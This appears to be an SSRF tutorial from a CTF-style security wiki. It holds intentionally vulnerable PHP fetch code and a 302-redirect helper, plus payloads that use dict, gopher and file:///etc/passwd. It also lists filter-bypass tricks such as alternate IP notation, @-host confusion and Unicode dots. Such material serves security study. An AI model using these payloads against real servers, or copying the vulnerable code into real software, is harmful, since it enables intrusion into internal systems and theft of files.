# SSRF

## Introduction to SSRF

SSRF, Server-Side Request Forgery, is a vulnerability where an attacker constructs a request that is initiated by the server. Generally, SSRF attacks target internal systems that are inaccessible from the external network.

The root cause of this vulnerability is that the server provides functionality to fetch data from other server applications without filtering or restricting the target address.

There are mainly 5 types of attacks that an attacker can achieve using SSRF:

1.  Port scanning of the external network, the server's internal network, and localhost to obtain banner information of some services
2.  Attacking applications running on the internal network or localhost (e.g., buffer overflow)
3.  Fingerprinting internal web applications by accessing default files
4.  Attacking internal and external web applications, mainly attacks achievable with GET parameters (e.g., Struts2, SQL injection, etc.)
5.  Reading local files using the `file` protocol, etc.

## Scenarios Where SSRF Vulnerabilities Appear

-   Any place that can initiate outbound network requests may have SSRF vulnerabilities
-   Requesting resources from remote servers (Upload from URL, Import & Export RSS Feed)
-   Built-in database functionality (Oracle, MongoDB, MSSQL, Postgres, CouchDB)
-   Webmail fetching emails from other mailboxes (POP3, IMAP, SMTP)
-   File processing, encoding processing, attribute information processing (ffmpeg, ImageMagick, DOCX, PDF, XML)

## Common Backend Implementations

1.  `file_get_contents`

    ```php
    <?php
    if (isset($_POST['url'])) { 
        $content = file_get_contents($_POST['url']); 
        $filename ='./images/'.rand().';img1.jpg'; 
        file_put_contents($filename, $content); 
        echo $_POST['url']; 
        $img = "<img src=\"".$filename."\"/>"; 
    }
    echo $img;
    ?>
    ```

    This code uses the `file_get_contents` function to fetch an image from a user-specified URL. It then saves it to disk with a random filename and displays it to the user.

2.  `fsockopen()`

    ```php
    <?php 
    function GetFile($host,$port,$link) { 
        $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
        if (!$fp) { 
            echo "$errstr (error number $errno) \n"; 
        } else { 
            $out = "GET $link HTTP/1.1\r\n"; 
            $out .= "Host: $host\r\n"; 
            $out .= "Connection: Close\r\n\r\n"; 
            $out .= "\r\n"; 
            fwrite($fp, $out); 
            $contents=''; 
            while (!feof($fp)) { 
                $contents.= fgets($fp, 1024); 
            } 
            fclose($fp); 
            return $contents; 
        } 
    }
    ?>
    ```

    This code uses the `fsockopen` function to fetch data (files or HTML) from a user-specified URL. This function uses a socket to establish a TCP connection with the server and transmits raw data.

3.  `curl_exec()`

    ```php
    <?php 
    if (isset($_POST['url'])) {
        $link = $_POST['url'];
        $curlobj = curl_init();
        curl_setopt($curlobj, CURLOPT_POST, 0);
        curl_setopt($curlobj,CURLOPT_URL,$link);
        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($curlobj);
        curl_close($curlobj);

        $filename = './curled/'.rand().'.txt';
        file_put_contents($filename, $result); 
        echo $result;
    }
    ?>
    ```

    Using `curl` to fetch data.

## Scenarios That Hinder SSRF Exploitation

-   The server has OpenSSL enabled, preventing interactive exploitation
-   Server-side authentication required (Cookies & User:Pass), preventing perfect exploitation
-   Restricting request ports to common HTTP ports, such as 80, 443, 8080, 8090
-   Disabling unnecessary protocols. Only allowing HTTP and HTTPS requests. This can prevent issues caused by file:///, gopher://, ftp://, etc.
-   Unified error messages to prevent users from determining remote server port status based on error messages

## Using SSRF for Port Scanning

Determine port status based on the server's response information. Most applications do not distinguish ports, and port status can be determined through the returned banner information.

Backend implementation:

```php
<?php 
if (isset($_POST['url'])) {
    $link = $_POST['url'];
    $filename = './curled/'.rand().'txt';
    $curlobj = curl_init($link);
    $fp = fopen($filename,"w");
    curl_setopt($curlobj, CURLOPT_FILE, $fp);
    curl_setopt($curlobj, CURLOPT_HEADER, 0);
    curl_exec($curlobj);
    curl_close($curlobj);
    fclose($fp);
    $fp = fopen($filename,"r");
    $result = fread($fp, filesize($filename)); 
    fclose($fp);
    echo $result;
}
?>
```

Construct a frontend page:

```html
<html>
<body>
  <form name="px" method="post" action="http://127.0.0.1/ss.php">
    <input type="text" name="url" value="">
    <input type="submit" name="commit" value="submit">
  </form>
  <script></script>
</body>
</html>
```

Requesting non-HTTP ports can return banner information.

Alternatively, 302 redirects can be used to bypass HTTP protocol restrictions.

Helper script:

```php
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data");
?>
```

[Tencent SSRF Vulnerability (Excellent Exploitation Point) with Exploitation Script](https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html)

## Protocol Exploitation

-   Dict Protocol

    ```
    dict://fuzz.wuyun.org:8080/helo:dict
    ```

-   Gopher Protocol

    ```
    gopher://fuzz.wuyun.org:8080/gopher
    ```

-   File Protocol

    ```
    file:///etc/passwd
    ```
    
## Bypass Techniques
1.  Changing IP Address Notation
    For example, `192.168.0.1`
    
    - Octal format: `0300.0250.0.1`
    - Hexadecimal format: `0xC0.0xA8.0.1`
    - Decimal integer format: `3232235521`
    - Hexadecimal integer format: `0xC0A80001`
    - There is also a special abbreviated mode, for example, the IP `10.0.0.1` can be written as `10.1`

2.  Exploiting URL Parsing Issues
    In some cases, the backend program may parse the accessed URL and filter the parsed host address. This can lead to improper URL parameter parsing, allowing bypass of the filter.
    For example:
    -   `http://www.baidu.com@192.168.0.1/` and `http://192.168.0.1` both request the content of `192.168.0.1`
    -   A domain that can point to any IP `xip.io`: `http://127.0.0.1.xip.io/` ==> `http://127.0.0.1/`
    -   Short URL `http://dwz.cn/11SMa` ==> `http://127.0.0.1`
    -   Using fullwidth period `。`: `127。0。0。1` ==> `127.0.0.1`
    -   Using Enclosed Alphanumerics
        ```
        ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
        List:
        ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
        ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
        ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
        ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
        Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
        ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
        ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
        ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
        ```
        
## Impact

* Port scanning of the external network, the server's internal network, and localhost to obtain banner information of some services;
* Attacking applications running on the internal network or localhost (e.g., buffer overflow);
* Fingerprinting internal web applications by accessing default files;
* Attacking internal and external web applications, mainly attacks achievable with GET parameters (e.g., Struts2, SQL injection, etc.);
* Reading local files using the file protocol, etc.

## References

-   ["Build Your SSRF EXP Autowork" by Zhu Zhu Xia](http://tools.40huo.cn/#!papers.md)
-   [Tencent SSRF Vulnerability (Excellent Exploitation Point) with Exploitation Script](https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html)
-   [Bilibili Sub-site: From Information Disclosure to SSRF to Command Execution](https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html)
